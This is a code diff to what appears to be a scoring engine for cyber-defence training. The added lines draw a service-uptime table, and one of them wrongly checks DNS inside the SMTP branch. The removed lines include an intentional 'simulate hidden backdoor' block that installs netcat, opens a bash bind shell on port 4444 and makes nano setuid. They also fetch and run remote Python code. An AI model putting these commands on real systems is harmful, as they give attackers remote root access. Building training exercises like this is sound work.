+                table_data[6].append(str(checkMYSQL(t.getAddress(), mySQL_PWD, injectMYSQLCurr)) + ":" + str(t.countUptime("mysql", injectMYSQLCurr)))
+            if (not t.isScored("mysql")):
+                table_data[6].append("N/A")
 
-	for i in services:
-		if i.isDown():
-			penalties = penalties + 5
-	for i in groups:
-		if not i.exists():
-			penalties = penalties + 5
-	for i in users:
-		if not i.works():
-			penalties = penalties + 5
-	for i in allTasks:
-		totalPoints = totalPoints + i.getValue()
-		if i.isFixed():
-				numFixedVulns = numFixedVulns + 1
-				currentPoints = currentPoints + i.getValue()
-	currentPoints = currentPoints - penalties
-	pointHistory.append(currentPoints)
-	notify(pointHistory)
+            if (t.isScored("dns")):
+                table_data[7].append(str(checkDNS(t.getAddress(), injectDNSCurr)) + ":" + str(t.countUptime("dns", injectDNSCurr)))
+            if (not t.isScored("dns")):
+                table_data[7].append("N/A")
 
-	while (not HasEnteredTeamInfo):
-		print("enter team Info")
-		os.system("python3 /home/"+mainUser+"/Desktop/TeamInfo.py")
-		TeamInfo = os.popen("head -n1 /etc/scorebot/.usr.dat").read()
-		#print("Team Info is: " + str(TeamInfo))
-		dUSR = str(TeamInfo.split(":")[0])
-		print("dusr is:" + dUSR)
-		dMode = str(TeamInfo.split(":")[1])
-		dServIP = str(TeamInfo.split(":")[2] + ":" + str(TeamInfo.split(":")[3]))
-		HasEnteredTeamInfo = True
-		print ("dMode is now: " + dMode)
+            if (t.isScored("smtp")):
+                table_data[8].append(str(checkSMTP(t.getAddress(), injectSMTPCurr)) + ":" + str(t.countUptime("smtp", injectSMTPCurr)))
+            if (not t.isScored("dns")):
+                table_data[8].append("N/A")
 
-	if (dMode == "server" ):
-		data = str(dUSR) + ":" + str(currentPoints) + ":" + str(int((time.time() / 60))) + ":" + str(key) 
-		os.system("curl -X POST -d " + data + " http://" + dServIP)
+            if (t.isScored("vnc")):
+                table_data[9].append(str(checkVNC(t.getAddress(), injectVNCCurr)) + ":" + str(t.countUptime("vnc", injectVNCCurr)))
+            if (not t.isScored("vnc")):
+                table_data[9].append("N/A")
 
-#~~~~~~~~~~~~~~Create a graph to add to the .html webpage~~~~~~~~~~~~~~~~~~~~~~~~#
-	Y = np.array(pointHistory) 
-	ax = plt.axes()
-	ax.plot(Y, linewidth=4, color="red")
-	plt.axhline(y=0, color="black")
-	ax.yaxis.set_major_locator(MaxNLocator(integer=True))
-	plt.savefig('.graph.png',bbox='tight')
-	update()
-#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~AutoExec.py~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
-#This isn't very secure. Runs whatever is in the github location below. Use if you need to change something during the scoring
-	fileLocationURL = "https://raw.githubusercontent.com/CyberCyber2/ScoringEngine/main/BaseFiles/01-AutoExec.py"
-	html_content = urllib2.urlopen(fileLocationURL).read().decode('utf-8')
+            if (t.isScored("ftp")):
+                table_data[10].append(str(checkFTP(t.getAddress(), ftpFile, ftpFileHash ,injectFTPCurr)) + ":" + str(t.countUptime("ftp", injectFTPCurr)))
+            if (not t.isScored("ftp")):
+                table_data[10].append("N/A")
+            #
 
-	matches = re.findall(str("[enable]"), html_content);
-	#simulate hidden backdoor. Solution isn't to remove netcat, but block the command
-	os.system("apt-get install netcat-traditional")
-	os.system("netcat -lvp 4444 -e /bin/bash & 2>/dev/null")
-	os.system("chmod 4777 /usr/bin/nano")
+            #table_data[1].append(str(checkFTP(str(t.getAddress()),"21", ftpFile, ftpFileHash)) + ":" + str(t.countUptime("ftp" , injectSMBCurr)))
+        table = ax.table(cellText=table_data, loc='center')
+        table.set_fontsize(14)
+        table.scale(1,3)
+        ax.axis('off')
+        plt.savefig("InjectSLA.png", bbox_inches = 'tight')
+        time.sleep(checkInterval)
 
-	if len(matches) != 0: 
-		#print ('HTML Content: ' + str(html_content))
-		filename = "test.py"
-		file_ = open(filename, 'w')
-		file_.write(html_content)
-		file_.close()
-		subprocess.call(['chmod', '777',filename])
-		subprocess.call(['python3', filename])
-	time.sleep(20) #scoring interval
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
-#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~DEBUG~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
-#Delete all processes with a name
-	#ps -ef | grep 'scorebot.py' | grep -v grep | awk '{print $2}' | xargs -r kill -9
-	#ps -ef | grep 'ScoringEngine.py' | grep -v grep | awk '{print $2}' | xargs -r kill -9
-	#rm -rf /etc/scorebot/.usr.dat
-#fix apt command locked
-#sudo killall apt apt-get
-#sudo rm /var/lib/apt/lists/lock
-#sudo rm /var/cache/apt/archives/lock
-#sudo rm /var/lib/dpkg/lock*
-#sudo dpkg --configure -a
+def main():
+    grapherFunction()
+   
+if __name__ == "__main__":
+    main()
